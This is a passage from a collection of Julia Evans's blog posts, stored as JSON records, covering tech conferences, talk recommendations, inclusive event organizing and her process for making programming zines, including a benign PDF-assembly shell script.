resembles\nhow  import  actually works.\n [Video] \n I talked about why IPython Notebook and Pandas are my favorite tools\nfor exploratory data analysis, and people said they enjoyed how\nenthusiastic I was afterwards. Yay!\n [Video] ,\n [Slides] ,  [pandas cookbook] \n \n\n A few more talks that I want to watch the videos for, but can’t\ncomment on because, well, I haven’t yet. \n\n \n For Lack of a Better Name(server): DNS Explained ,\nby Lynn Root \n Cache me if you can: memcached, caching patterns and best practices \nby Guillaume Ardaud \n Kneel And Disconnect: Getting The Fastest Connection Out Of A Hostname \nby Ashwini Oruganti \n An Introduction to Twisted  by Stacey Sern \n The Python Pipeline: Why you should reach out to local teachers and how to do it  by Selena Deckelmann \n Realtime predictive analytics using scikit-learn & RabbitMQ  by\nMichael Becker \n Distributed Computing Is Hard, Lets Go Shopping  by Lewis Franklin \n Fan-in and Fan-out: The crucial components of concurrency  by Brett\nSlatkin \n Building and breaking a Python sandbox  by Jessica McKellar (I saw a\nversion of this at Hacker School and it was amazing) \n Python in the Browser: Intro to Brython  by Susan Tan \n Garbage Collection in Python  by Benjamin Peterson \n Subprocess to FFI: Memory, Performance, and Why You Shouldn’t Shell Out  by Christine Spang \n \n\n I never stop being impressed with people I meet at PyCon. Conferences\nare so hard! I want to meet all the people and do all the things and\nbe in 3 places at things. And the sprints haven’t even happened yet! \n\n I’m so thankful to all the organizers for doing so much work to make\nthis possible. The conference chair\n Diana Clarke  got a standing\novation at the closing session, and more than deserved it. \n\n ♥ PyCon. \n"},
{"url": "https://jvns.ca/blog/2014/11/27/pydata-nyc-i-gave-a-machine-learning-talk-yay/", "title": "PyData NYC (I gave a machine learning talk! yay!)", "content": "\n      This past weekend I went to PyData NYC. It was super fun! I got to meet\nsome people who do machine learning in different fields than me (THE\nBEST) and a guy at the bar told me about his classmates’ adventures in\nhacking login systems in Novell Netware. (Also the best. It turns out\nthat one of the nice things about having a blog is that people\noccasionally come up to me at conferences and tell me GREAT THINGS). \n\n And I gave my first-ever machine learning talk! I often feel like the\nmain (only?) thing I’ve learned about machine learning so far is how\nimportant it is to evaluate your models and make sure they’re actually\ngetting better. So I gave a talk called “Recalling with precision” about\nthat (a terrible pun courtesy of\n @avibryant ). \n\n The basic structure: \n\n \n You’re building models, and you do lots of experiments \n You want to remember all of the results forever, so that you can tell\nif you’re improving \n Some arguments for why it’s important to evaluate whether your models\nactually work (for an example of what can go wrong, see  The Value Added Teacher Model Sucks ). \n “Just remember everything forever” is much easier said than done \n So let’s describe a lightweight system to actually remember some\nthings forever! (basically: store training results in S3 forever;\nmake a webapp to draw  lots of graphs  using those results) \n It exists! It’s open source.  http://github.com/stripe/topmodel \n \n\n (It’s still pretty new. If you try it and have thoughts,\n let me know? ) \n\n People asked lots of questions, so I think it may have been useful. It’s\nhard to tell, with talks :) \n\n Some things I learned at PyData: (links largely taken from\n Michael Becker’s great wrap-up post ) \n\n \n\n csvkit is great \n\n Sasha Laundy  (who is fantastic) gave a\ntotally wonderful talk called  “How to make your future data scientists\nlove you” . She told some\ngreat data horror stories about missing data, data that you can’t join,\nand talked about some basic tools for auditing datasets to make sure\nthat it’s actually possible to answer questions about data. And she\ntalked about practical, useful tools like\n csvkit ! I have already\ndiscovered that it includes the amazing  csvlook  which will format your\ncsv in a human-readable table. \n\n Her talk reminded me of when I used to work for a consulting company and\nhow hard it is to communicate with clients about what data they need to\nprovide for you to be able to answer the questions. Communication is\n hard . \n\n Automatically training models? \n\n I’m usually pretty skeptical when people talk about automatically\ntraining models.  Dan Blanchard \ndescribed a  framework called SKLL  for\nusing scikit-learn a little more easily which seemed plausible to me.\nBasically you tell it which models you’re interested in experimenting\nwith (decision trees? random forests? SVM?), make a config file, and\nit’ll train all of them and give you predictions and serialized models. \n\n It has a  well-written tutorial .\nGood documentation makes me so happy. \n\n Blaze: a different way to run queries \n\n I talked to the folks at Continuum Analytics a little bit about Blaze. \n\n As I understand it, it’s a library that translates pandas-like queries \n\n negative_balances = t[t.balance < 0]\nnegative_balances[['user', 'date', 'balance']]\n \n\n into SQL queries \n\n SELECT merchant, date, balance\nFROM table\nWHERE balance < 0\n \n\n And it supports more than one database backend! Like CSVs, HDF5 files,\nand maybe some other weird formats. \n\n I’m still not sure if it’s useful to me and it’s in a pretty early\nstage. But, neat! \n\n Things I missed \n\n A few things I want to remind myself to look at later: \n\n \n Monary: Really fast analysis with MongoDB and NumPy  (because “really fast analysis” and “MongoDB”? really?) \n Advanced IPython Notebook widgets  (because I’ve been trying to learn about these interactive widgets  forever ) \n On building a data science curriculum  (in case I ever want to teach a class) \n \n"},
{"url": "https://jvns.ca/blog/2014/06/22/con-talks-are-up/", "title": "!!Con talks are up", "content": "\n      The talk recordings and transcripts for the amazing talks at !!Con\nhave been posted! Go learn about EEG machines, how to stay in love\nwith programming, type theory, dancing robots, hacking poetry, and more! \n\n Here they are !! \n\n Erty Seidel  did pretty much 100% of the work\nfor the talk recordings. Super pleased with the results. \n\n"},
{"url": "https://jvns.ca/blog/2015/04/15/adacamp-montreal-2015/", "title": "AdaCamp Montreal 2015", "content": "\n     \n\n I went to  AdaCamp  these last couple of days. I\nwant to talk about some of the awesome stuff that happened! \n\n AdaCamp is an unconference, which means that people decide what the\nsessions will be about on the first day of the conference. Here are some\nthings I’m thinking about! \n\n Testing \n\n I went to a really, really interesting session about software testing by\nsomeone who works as a software tester. I work as a developer, and I’ve\nnever worked with a QA team! I didn’t know there were people who\nspecialized in testing software and were really awesome at it who don’t\nwrite programs! This was super cool to learn. I still don’t know how to\nthink about separating out the responsibilities of writing the software\nand verifying the software – obviously individual developers also need\nto be responsible for writing correct software, and it still feels\nstrange to me to hand any of that off. \n\n But  Camille Fournier  told me on twitter\nabout user acceptance testing and how you can have a QA team that checks\nthat the software  makes sense to users  and, like, talks to them and\nstuff, not just software that’s theoretically correct. So that’s pretty\ncool. \n\n Awesome people \n\n I met a lot of really interesting people! I met sysadmins and people who\nhad been programming for a long time and software testing and people who\nknow a lot about science fiction and ham radio and bikes and publishing\nand zines and Quebec and libraries and Wikipedia (someone wrote their\n dissertation  on Wikipedia. Wow.). I learned SO MUCH about Wikipedia.\nAnd almost all of those people identified as women! A++ would meet\ndelightful people again. \n\n Codes of conduct \n\n This session convinced me open spaces are a good idea. \n\n Initially I didn’t want to go because I was interested in some very\nspecific aspects of codes of conduct (deescalating situations + how to\nmake CoCs less intimidating to people who are genuinely good intentioned\nbut not familiar with a given community + when to model behavior\nimplicitly vs writing down explicit rules). And I told someone during a\nbreak that I didn’t want to go to the session because I thought people\nwouldn’t be discussing the thing I wanted to talk about. \n\n And she said AWESOME. THOSE ARE AWESOME THINGS TO TALK ABOUT. COME WITH\nME AND WE WILL TALK ABOUT THAT. And we did! And I don’t have answers\nabout any of those things, but I got to hear some new perspectives and\nstories and now I know a couple more things. And the other people seemed\nto think the questions I had were interesting <3. \n\n And it made me remember – when I think that I’m the only person who has\na given concern or question or experience, I’m usually wrong :) \n\n Moderation \n\n There were a lot of unstructured discussion sessions at AdaCamp. This\nwas really cool, because it means you can cover a lot of ground. I also\nwas reminded again of how important good moderation + facilitation is,\nand how much I want to get better at it. I’m working on learning how to: \n\n \n create some explicit structure around a session (“let’s discuss these\n4 topics, and spend ~15 minutes on each one. does that sound good?“) \n tell someone when they’ve said enough <3 (“thanks so much! I’d love to\nhear from some people who haven’t said as much yet”) \n move the discussion back on track if it’s veered away (“okay awesome!\nDoes anyone have anything else to say about $topic, or should we move\non to $next_thing?“) \n \n\n People take up really incredibly different amounts of space in\ndiscussions, and I really really want to get better at making sure\npeople who are quieter get a chance to say their super interesting\nthings. Interrupting people is hard for me! \n\n After AdaCamp I felt like there are a lot of great people in the world\nwho are trying their best to do what’s right and have a lot of good\nideas about how to do that and want to have the same conversations that\nI want to have. A little more than usual =) \n\n"},
{"url": "https://jvns.ca/2012/12/16/all_girl_hack_night/", "title": "Montreal All-Girl Hack Night #1: AMAZING", "content": "\n      My awesome friend  Monica  and I recently organized\nthe first edition of  Montreal All-Girl Hack Night .\nWe kept going to programmer meetups in Montreal and being upset there was\nusually at most one other woman there. So we decided to try to find out if\nthere are actually women who program out there. (spoiler: yes) \n\n \n\n In point form: \n\n \n 25 or so women came. \n Turns out there are definitely tons of women who program and do all kinds of different things and are fantastic. I was surprised and delighted by the amount of amazing people who showed up. \n Languages women program in: C, Python, PHP, Ruby, ActionScript, Java (sometimes specifically for Android), R, C++, Scala, … \n People I met had jobs doing: web frontend stuff, teaching, web backend stuff (in Java, in PHP), machine learning, journalism, game development, coding for banks, bioinformatics, and more things that I have forgotten \n Notman house let us use the space for free, and people there helped us move tables around, clean up afterwards, and were generally amazing. \n Not too much actual hacking went on – some people interested in Python claimed the couches, and there were people talking about Android and getting someone’s Android app installed on their phone in a corner. Some people wanted ideas for projects that they could work on, so may come up with some. More hacking next time! \n Also turns out that Twitter is actually an effective way to advertise. May start using Twitter. \n Github pages is the easiest way to set up a website I’ve tried so far. \n Also you can make a pull request on the website! ( repository ) \n Budget breakdown: domain name $5, snacks $35, beer $30, plastic cups $5. \n \n\n There’s going to be another one in January. YEAH. \n"},
{"url": "https://jvns.ca/blog/2014/09/20/strange-loop-2014/", "title": "Strange Loop 2014", "content": "\n      I spent some of last week at\n Strange Loop . I met lots of new\ncurious, friendly, wonderful people, gave a talk that people really\nliked, played board games with friends, and generally had a great\ntime. \n\n It was also kind of a big deal for me personally! A year and a half\nago I gave\n my first lightning talk at a meetup ,\nand was super scared. I’ve heard a lot about how great of a conference\nStrange Loop was, and I really wouldn’t have anticipated then that \n\n \n I’d get to go \n they’d accept a talk I submitted ( “You can be a kernel hacker!” ) \n the room would be packed \n people would say things like “that was my favorite talk of the\nconference” \n \n\n I always imagine cool developer conferences like Strange Loop as being\nfull of wizard developers who know everything about programming. I\nwas worried that my talk would be too entry-level (I explain what a\nkernel is / what a system call is from the ground up, for instance). \n\n It turned out  tons  of people there didn’t know a lot about systems\nprogramming / how kernels work, and my choice to make the talk\naccessible made a lot of people happy. So far I’ve given a bunch of\ntalks and I’ve never regretted trying to make it easy to follow for as\nmany people as possible. \n\n \n\n I collected\n some of the comments from Twitter \nto keep me happy on sad days. (also: super useful for convincing\npeople they should have me speak when submitting future talk\nproposals!) \n\n talks to watch \n\n A few wonderful talks that I think are worth watching: \n\n \n Concurrency Options on the JVM  by\n Jessica Kerr  was a wonderful\noverview of concurrency models in various JVM languages (Akka,\ncore.async, futures, …), what tradeoffs they have, and how to\nthink about them. Every time I’ve seen her speak I’ve been\nimpressed. \n How Julia Goes Fast by  Leah Hanson \nwas a solid introduction to the choices the Julia language has made\nin order to perform well for numerical computations, and how to\nwrite your own fast Julia programs. For some reason the video isn’t\nup yet. \n Benchmarking: You’re Doing It Wrong  by\n Aysylu Greenberg  was a  wonderful  talk\nexplaining common errors people make when benchmarking, and laying\nout strategies for writing better benchmarks. The next time I need\nto make a benchmark I will absolutely watch this talk. \n Jepsen II: Linearizable Boogaloo  by\n Kyle Kingsbury  was wonderful, as all of\nhis talks are. The room was packed, and he struck a great balance\nbetween discussing serious problems he’d found in distributed\nsystems (in this case RabbitMQ and Elastic Search), and\nacknowledging that the developers who work on large distributed\nsystems are solving a  really hard problem . The message wasn’t that\npeople building distributed systems are doing bad work, but that we\nneed to be honest about the tradeoffs that the systems we build are\nmaking, and document known problems. For instance, Elastic Search is\na great search engine, but you should absolutely not use it as a\nprimary datastore because it can lose your data. \n \n\n Talks I heard good things about, and am planning to watch the videos\nof later: \n\n \n Art.js: Transfigure data to Create 21st Century Art \nby Sarah Palermo \n The Sociology of Programming Languages \nby Leo Meyerovich (a talk about programming\nlanguage that involves an actual study, with data, of how people\nchoose programming languages! How can it be!) \n I have hard nothing but rave reviews of\n Practical Fractals in Space \nby Michelle Brush \n Idris: Practical Dependent Types with Practical Examples \nby Brian McKenna was described to me as “types from space”. I’m not a\nhuge type theory nerd, but this sounded like a fun talk to watch. \n Spreadsheets for developers  by Felienne Hermans is by someone who has\na  PhD in spreadsheets . How cool is that? I have every regret\nabout not watching this talk. \n Towards “annex”, a Fact Based Dependency System  by Mark Hibberd \n Simulation Testing  by\nMichael Nygard \n \n\n inclusive yay \n\n Strange Loop tried really hard to be more inclusive this year. Bridget\nHillyer wrote a great\n wrap up post . The most striking\nthing to me was this: \n\n \n [We engaged Ashe Dryden to help us come up with a plan]. I took that\nplan and made a list of the steps included. I assumed Alex Miller\nand I would prioritize them and decide what we could actually pull\noff. Alex said we should do  all  of them. There were 58 items on\nthat list. Plus, Alex did many things beyond what was on that list\nto make the conference more accessible and comfortable for all\ninvolved. \n \n\n I love the idea of taking a huge list of ideas to make a conference\nmore inclusive and just doing every single one. There were tons of\nwomen at the conference, and a lot of my favorite talks were by women. \n\n I’ve become pretty used to spaces with lots of women developers in\nthem after Hacker School, so I didn’t find the number of women\nsuper surprising (of  course  there are tons of awesome women who write\ncode! that’s how it  always is ). 12% doesn’t even feel like a lot to\nme! But it was pretty great, and I got to meet a bunch of old and new\nfriends. \n\n types \n\n One small thing that I saw at Strange Loop that I  didn’t  like was a\ncouple of talks making the following argument: \n\n \n languages with static type systems prevent a class of errors that\ndynamic type systems don’t \n therefore those languages are safer \n therefore if you’re writing mission critical systems, you should use\nstatic typing \n \n\n This class of argument really bothers me, because it doesn’t really\nhold up in court by itself. I  love  using static type checking, and I\nwould love to see evidence that statically typed programs actually\nhave less bugs. \n\n But this argument by itself isn’t that great. Strange Loop is a\nconference where we have a really unique combination of academics and\ndevelopers with lots of industry experience. We could talk about this\nin a more nuanced way! \n\n \n are there studies with evidence that static type checking reduces\nthe number of bugs? \n what about the claim that dynamic languages are faster to develop\nin? Do we have any evidence for that? \n \n\n Or I’d love to see some analysis of case studies about organization\nthat have made a big switch (like Twitter’s switch to Scala, for\ninstance), by someone without an agenda to push (like “wow Scala is\ngreat!“). \n\n It basically seemed like there were talks by people who really liked\nstatic languages, and talks by people who really liked dynamic\nlanguages, and they were just talking past each other. I didn’t learn\nanything new from these talks. \n\n I’d like to go back next year and see better arguments. See you next\nyear, Strange Loop! <3 \n"},
{"url": "https://jvns.ca/blog/2019/02/16/--con-2019--submit-a-talk-/", "title": "!!Con 2019: submit a talk!", "content": "\n     \n\n As some of you might know, for the last 5 years I’ve been one of the organizers for a conferences\ncalled  !!Con . This year it’s going to be held on  May 11-12 in NYC . \n\n The submission deadline is  Sunday, March 3  and you can  submit a talk here . \n\n (we also expanded to the west coast this year:  !!Con West  is next\nweek!! I’m not on the !!Con West team since I live on the east coast but they’re doing amazing work,\nI have a ticket, and I’m so excited for there to be more !!Con in the world) \n\n !!Con is about the joy, excitement, and surprise of computing \n\n Computers are AMAZING. You can make programs that seem like magic, computer science has all kind of\nfun and surprising tidbits, there are all kinds of ways to make really cool art with computers, the\nsystems that we use every day (like DNS!) are often super fascinating, and sometimes our computers\ndo REALLY STRANGE THINGS and it’s very fun to figure out why. \n\n !!Con is about getting together for 2 days to share what we all love about computing. The only rule\nof !!Con talks is that the talk has to have an exclamation mark in the title :) \n\n We originally considered calling !!Con ExclamationMarkCon but that was too\nunwieldy so we went with !!Con :). \n\n !!Con is inclusive \n\n The other big thing about !!Con is that we think computing should include everyone. To make !!Con a\nspace where everyone can participate, we \n\n \n have open captioning for all talks (so that people who can’t hear well can read the text of the\ntalk as it’s happening). This turns out to be great for LOTS of people – if you just weren’t\npaying attention for a second, you can look at the live transcript to see what you missed! \n pay our speakers & pay for speaker travel \n have a code of conduct (of course) \n use the RC  social rules \n make sure our washrooms work for people of all genders \n let people specify on their badges if they don’t want photos taken of them \n do a lot of active outreach to make sure our set of speakers is diverse \n \n\n past !!Con talks \n\n I think maybe the easiest way to explain !!Con if you haven’t been is through the talk titles! Here\nare a few arbitrarily chosen talks from past !!Cons: \n\n \n Four Fake Filesystems! \n Islamic Geometry: Hankin’s Polygons in Contact Algorithm!!! \n Don’t know about you, but I’m feeling like SHA-2!: Checksumming with Taylor Swift \n MissingNo., my favourite Pokémon! \n Music! Programming! Arduino! (Or: Building Electronic Musical Interfaces to Create Awesome) \n How I Code and Use a Computer at 1,000 WPM!! \n The emoji that Killed Chrome!! \n We built a map to aggregate real-time flood data in under two days! \n PUSH THE BUTTON! 🔴 Designing a fun game where the only input is a BIG RED BUTTON! 🔴 !!! \n Serious programming with jq?! A practical and purely functional programming language! \n I wrote to a dead address in a deleted PDF and now I know where all the airplanes are!! \n Making Mushrooms Glow! \n HDR Photography in Microsoft Excel?! \n DHCP: IT’S MOSTLY YELLING!! \n Lossy text compression, for some reason?! \n Plants are Recursive!!: Using L-Systems to Generate Realistic Weeds \n \n\n If you want to see more (or get an idea of what !!Con talk descriptions usually look like), here’s every past year of the conference: \n\n \n 2018:  talk descriptions  and  recordings \n 2017:  talk descriptions  and  recordings \n 2016:  talk descriptions  and  recordings \n 2015:  talk descriptions  and  recordings \n 2014:  talk descriptions  and  recordings \n \n\n this year you can also submit a play / song / performance! \n\n One difference from previous !!Cons is that if you want submit a non-talk-talk to !!Con this year\n(like a play!), you can! I’m very excited to see what people come up with. For more of that see\n Expanding the !!Con aesthetic . \n\n all talks are reviewed anonymously \n\n One big choice that we’ve made is to review all talks anonymously. This means that we’ll review your\ntalk the same way whether you’ve never given a talk before or if you’re an internationally\nrecognized public speaker. I love this because many of our best talks are from first time speakers\nor people who I’d never heard of before, and I think anonymous review makes it easier to find great\npeople who aren’t well known. \n\n writing a good outline is important \n\n We can’t rely on someone’s reputation to determine if they’ll give a good talk, but we do need a way\nto see that people have a plan for how to present their material in an engaging way. So we ask\neveryone to give a somewhat detailed outline explaining how they’ll spend their 10 minutes. Some\npeople do it minute-by-minute and some people just say “I’ll explain X, then Y, then Z, then W”. \n\n Lindsey Kuper wrote some good advice about writing a clear !!Con outline here which has some examples of really good outlines  which you can see here . \n\n We’re looking for sponsors \n\n !!Con is pay-what-you-can (if you can’t afford a $300 conference ticket, we’re the conference for\nyou!). Because of that, we rely on our incredible sponsors (companies who want to build an inclusive\nfuture for tech with us!) to help make up the difference so that we can pay our speakers for their\namazing work, pay for speaker travel, have open captioning, and everything else that makes !!Con the\namazing conference it is. \n\n If you love !!Con, a huge way you can help support the conference is to ask your company to sponsor\nus!  Here’s our  sponsorship page  and you can email me at\njulia@jvns.ca if you’re interested. \n\n hope to see you there ❤ \n\n I’ve met so many fantastic people through !!Con, and it brings me a lot of joy every year. The thing\nthat makes !!Con great is all the amazing people who come to share what they’re excited about every\nyear, and I hope you’ll be one of them. \n\n"},
{"url": "https://jvns.ca/blog/2016/08/29/how-i-made-a-zine/", "title": "How (and why) I made a zine", "content": "\n     \n\n I just finished up a zine project (it will be up soon  here ! I will let you all know when it is up DO NOT WORRY). \n\n A few people asked me how a zine is made so I thought I’d write down the\nprocess. \n\n what’s a zine? why write zines? \n\n A zine is a short informal publication, often handwritten or hand-assembled. I\nhave zines about a) someone’s life and what she thinks about stuff (a\n“perzine”) b) star trek c) what it’s like for one person to be deaf and date a\nnon-deaf person d) french expressions for english speakers e) following a band\naround Canada for a summer f) safer sex. \n\n They’re often first-person and about a really specific thing. And delightful. You know what has a lot of really specific things? PROGRAMMING. \n\n In 2014, I gave a talk at PyCon about debugging tools I loved. When I was preparing for that talk, Amelia Greenhall had just written this really excellent article  Start your own b®and: Everything I know about starting collaborative, feminist publications . If you’re interested at all in publishing things you should read it – it has a lot of really practical advice. \n\n I’ve always found stories of people starting their own publications compelling (that’s why I write a blog, after all!!), and I was like ME. I WANT TO START A MEDIA COMPANY. \n\n I came down from that after about 30 seconds. But I still wanted to publish something! A paper thing! And this article was about feminist things, and I’d read this book  Girls to the Front: The True Story of the Riot Grrrl Revolution Paperback  about riot grrl and people making feminist zines and starting punk bands, and I was like ME. I WANT TO MAKE A ZINE ABOUT THINGS THAT I LIKE. \n\n And I was giving this talk! I remembered hearing that Edward Tufte gave out\nhandouts in talks, and I thought that was a cool idea, so I figured I’d try\nit. I tweeted something like \n\n \n omg guys i want to write a zine about strace \n \n\n and everyone was like \n\n \n yes obviously this is a great idea \n \n\n So I decided to write a zine and give it out as a handout in my talk. \n\n making things fun is a great way to teach \n\n the reason I write zines is partly because I think they’re fun, but also for\npractical reasons. Fun, accessible content  works . People understand it. In\nmy most recent zine, I explain netstat, netcat, ngrep, tcpdump, wireshark,\nstrace, eBPF, dstat, and perf and a bunch of its subcommands. This is a lot of\nstuff!! But because it’s presented in an adorable tiny zine people are like\n“oh how interesting and cute!” and don’t hesitate to pick it up. \n\n Some of the things I want to explain are traditionally considered kind of\nadvanced! I didn’t learn about any of these things until I’d been\nprogramming for 10 years. But there’s no reason I couldn’t have\nlearned them earlier! It’s just that nobody told me. \n\n What I end up finding is that people will read my zines who I wouldn’t expect.\nPeople will read them even if they’re new to programming or new to Linux! And\nthey’ll often learn something and tell me “yeah, sure, I didn’t understand\n100% of it but a lot of it made sense!” To me this is a HUGE WIN. \n\n I spent years being scared of tcpdump. But it’s not really that scary, and if\nI can help a few people be a little less intimidated by it, then I’ve done my\njob. \n\n the tools \n\n For the first zine I wrote I: \n\n \n cut pieces of letter paper in half \n wrote on them in sharpie and pen \n went to a photocopy shop and assembled the zine by hand with a photocopier \n gave the master copy to the print shop people to copy \n scanned it and put it on my blog \n \n\n pretty basic, really cheap, pretty easy. \n\n The first zine ( about strace ) looked like this: \n\n \n \n \n\n I thought it looked great and I was delighted with it. I had been thinking\nabout feminist zines so I wrote a manifesto: \n\n \n \n \n\n Honestly I found sharpie got kind of old though – it worked well, but it\nsucks to not be able to erase anything and  scanning is annoying. I thought\nabout buying a tablet and I tried out the ipad pro with an apple pen. That was\nMAGICAL. It was also a thousand dollars and I am super clumsy so I was\ndefinitely not buying a $1000 tablet to draw zines. \n\n Then I discovered the  samsung galaxy tab a 9.7 , a super magical android tablet that was only $300 but let me draw super cool stuff. It comes with the Samsung “S pen” which works really well. If you’ve seen me post something that looks like this: \n\n \n \n \n \n \n\n it comes from that tablet. This is way easier to work with (I can come up with something and just click “share -> Twitter”!) \n\n So, I made a bunch of images and saved them. I used the Autodesk sketchbook\napp. They have a pro version that costs $7 or something. It’s pretty awesome. \n\n The second zine looks like this: \n\n \n \n \n \n \n\n It was easier to edit and make improvements which meant less weird charming\nmistakes but also I think I could put in more information! calling that a win. \n\n So! if you have a bunch of pages for a zine, how do you get them into a PDF\nyou can bring to a print shop? \n\n making pictures into pdfs \n\n This is possibly super boring to everyone but me but here is how I turn a\nbunch of pictures into pdfs. There are a bunch of awesome tiny pdf utilities\nout there. It took me a bunch of time to figure out how to put them together\nto do what I wanted. \n\n # start with a bunch of PNG images of your zine pages\n# convert them all to PDF\nfor i in *.png\n   do\n   \t  # imagemagick is the best thing in the world\n      convert $i $i.pdf\n   done\n\n# pdftk is awesome for combining pdfs into a single pdf\npdftk *.pdf cat output zine.pdf\n\n# pdfmod is a GUI that lets you reorder pages\npdfmod zine.pdf\n\n# pdfcrop lets you add margins to the pdf. this is good because otherwise the\n# printer will cut off stuff at the edges\npdfcrop --margin '29 29 29 29' zine.pdf zine-intermediate.pdf\n\n# pdfjam is this wizard tool that lets you take a normal ordered pdf and turn\n# it into something you can print as a booklet on a regular printer.\n# no more worrying about photocopying machines\npdfjam --booklet true --landscape --suffix book --letterpaper --signature 12 --booklet true --landscape zine-intermediate.pdf -o zine-booklet.pdf\n \n\n printing!!! \n\n This is the MOST FUN PART. You get to mass produce things and give them to people!!!!!!!!! Getting a huge stack of zines is like the best thing. \n\n So! This was a surprise to me but  print shops know how to print booklets .\nThey have MACHINES that can fold and staple zines! So if you want to print 200\nzines, you can literally bring a pdf, leave it with them, and they will\nproduce a box of amazing zines that are ready to go. \n\n This is always kind of heartening to me because I have trouble printing the\nzine and so do the print shop employees! Everyone always gets it wrong the\nfirst time and something is upside down. But then we fix it and it’s fine.\nPrinters are hard!! \n\n It’s not super super cheap – I’ve paid between $0.75 and $1.50 per zine to\nprint them. But I would much rather pay $0.25 each to get it stapled than to\nstaple 400 zines myself, since I can afford it. \n\n distribution \n\n Mostly I give away zines at conferences (“HELLO HAVE YOU HEARD THE GOOD WORD\nABOUT STRACE???“) and let people download the pdf on my website. This is\nreally fun and I think I have converted people to strace with a zine who would\nnot have taken the time to learn about it otherwise. \n\n I mostly want to tell people about the stuff I think is cool, and I don’t\nreally want to make money right now (I have a job for that), so I don’t\nusually try to sell them. \n\n Also I found out at the Montreal zine fair that the Quebec national archives\nwill accept any publication for inclusion in their archives, so I filled out a\nform and now my strace zine is part of the national archives of Quebec. \n\n As for shipping things on the internet: the most promising site I’ve found so\nfar for selling small booklet-y things is\n magcloud.com . I haven’t used them yet so I don’t\nknow. \n\n bubblesort zines \n\n I would be remiss not to mention @sailorhg’s amazing  bubblesort zines  about computer science. she has a bunch of them! go buy them! Here’s how she describes them: \n\n \n BubbleSort Zines are a monthly zine series filled with stories and hand-\ndrawn art and diagrams. They cover topics like circuits, sorting, memory,\nand tcp. Though the intended audience is high school students (think Hello\nRuby’s teenage sister), I was surprised by how many adults are also\nsubscribers! \n \n\n you could make a zine \n\n I think it’s fun because I kind of want to write a book sometimes, but writing\na book takes like a YEAR or MORE and is a huge commitment. Writing a zine is a\nlot easier and lower stakes and I get some of the fun rewards (“hey look at\nthis cool thing I made!“) without spending months editing a book. \n\n"},
{"url": "https://jvns.ca/blog/2015/01/12/data-day-texas-2015/", "title": "Data Day Texas 2015", "content": "\n     \n\n I went to Data Day Texas this past weekend. It was a 1-day conference,\nand I learned a lot! \n\n Here are some things I learned! (any misunderstandings are mine, of\ncourse :)) \n\n Charity Majors: Upgrade your database – without losing your data, your performance, or your mind \n\n This was by far my favorite talk ( slides are here ).\nCharity works at  Parse , where they manage many\nthousands of MongoDB collections (as far as I understand it, at least\none for each of their users). And sometimes they want to upgrade Mongo! \n\n I understood before seeing this talk that doing database upgrades was\nhard, and that it’s appropriate to be incredibly skeptical, but I didn’t\nhave any clue how to plan to reduce your uncertainty so that you can\nactually do the upgrade. \n\n Some things I learned: \n\n \n How bad can it be if you don’t test the upgrade properly? (she saw\none kind of query get 100x slower in the worst case, which would be a\ndisaster). The examples of what can go in an upgrade that she gave\nwere incredibly interesting. \n How much time is it appropriate to spend planning and testing a\ndatabase upgrade? (they spend about a year) \n How do you know if the new database can handle your production\nworkload? (snapshot it, take a day’s worth of operations and test it\nout on a production workload!) \n When you actually do the upgrade, how do you do it? (slowly, with\nlots of opportunities to roll back along the way) \n Does Mongo have merit? (They need to support a ton of very different\nworkloads for their users, and it’s a great fit for that.) \n \n\n There’s also a “A Very Short List Of Terrible Things Database Upgrades\nHave Done To Me” slide which is the best. \n\n It gave me a little more appreciation for what it means to do ops at\nscale and to keep services running. I pretty rarely see talks that I\nfeel really advance my understanding of a topic, and this was one of\nthem. \n\n (also, I think I have a thing or two to learn from her about writing\ntalk titles) \n\n Robert Munro – using humans to make your machine learning algorithms dramatically better \n\n Let’s say that you’re writing a classifier that’s doing sentiment\nanalysis. This is a task that’s pretty easy for humans (“is ‘had an\namazing time with my friends watching terrible cult movies today’\npositive?), but hard to do with machine learning, especially if you have\nlimited training data to use. \n\n He talked about how judiciously incorporating human input to get a\nbetter training set can give you much, much higher accuracy than just\nmessing with your model parameters. \n\n My absolute favorite thing about this talk was when he talked about the\nhuman/psychological aspects of using people to help you with\nclassifications! If you’re writing a cat classifier and every single\nthing you show the human is not a cat, they’ll get bored and exhausted. \n\n It made me think a lot about making sure if you’re asking people to help\nyou with a task, you need to \n\n \n make the task interesting \n make sure the people helping you out have a lot of impact on your\nclassification accuracy \n make sure that they  know  how high their impact is, and show them\nhow the model is improving! \n \n\n Ted Dunning – generating fake datasets \n\n This was a fun talk about simulating datasets to \n\n \n prove that you’re right about the Monty Hall problem \n debug a database bug when your client can’t give you the data that caused it \n do machine learning on data you don’t have \n \n\n of these, the first two made the most sense to me – I had a much harder time\nimagining how it would be useful to do machine learning based on a simulated\ndata set in real life, and I think I missed some of the explanation. \n\n And he told us about a tool called log-synth that he wrote to generate fake\ndatasets easily! I can pretty easily imagine myself using it to write ML\ntutorials :). It’s at\n https://github.com/tdunning/log-synth . \n\n"},
{"url": "https://jvns.ca/blog/2015/12/07/women-in-machine-learning-2015-fun/", "title": "Women in Machine Learning 2015 (fun!!!)", "content": "\n     \n\n I went to the  Women in Machine Learning  conference yesterday (part of  NIPS ). It was SO FUN. I never go to academic conferences, and talking to grad students about their research and what methods they think are exciting is amazing. I actually liked it a lot more than an industry conference because everything was so alien & unfamiliar to me and everyone knew way more about their field than me. I learned more than I did by going to (for instance) PyCon, which is a fantastic industry conference. \n\n It really made me want to reconsider what conferences I go to, and to go to more conferences in fields I’m less familiar with. \n\n The organizers did a great job putting it together and the talks were really good.\nHere is some stuff I thought was especially exciting! All of these talk descriptions are heavily paraphrased and I have probably misunderstood things. But I thought they were super cool and here’s what I got out of them. \n\n Is it all in the phrasing? (by  Lillian Lee ) \n\n She talked about her research on how phrasing affects the impact of, say, a tweet! Here’s  a classifier where you can write two tweets  and it’ll tell you which one it thinks will be retweeted more! And there’s a  corresponding quiz ! And a paper! I have not yet read the paper. \n\n I really loved this talk because guessing which tweet will get more RTs is a task that humans are ok at (they can guess right something like 75% of the time), but it’s not a trivial task! So it’s a pretty interesting place to try machine learning. And the methodology they used makes a lot of sense to me (pick tweets tweeted by the same person, that link to the same URL). And then they actually make progress using machine learning to do it! Neat. \n\n I feel like most ML I see is about tasks that humans can get 95% or 100% correct (like distinguishing cats from dogs, or whatever). So doing ML on tasks that have something intrinsically hard about them – where you maybe  can’t  ever get to 100% accuracy – is really interesting to me. \n\n She said she makes her talks intentionally not very technical, which I LOVED – she said she prefers to work hard to make the material easy to understand & interesting (without sacrificing rigor), and referred people to read the papers for numbers. a++ this is also what I love to do <3. (convince people to be interested and that your work is obvious, not 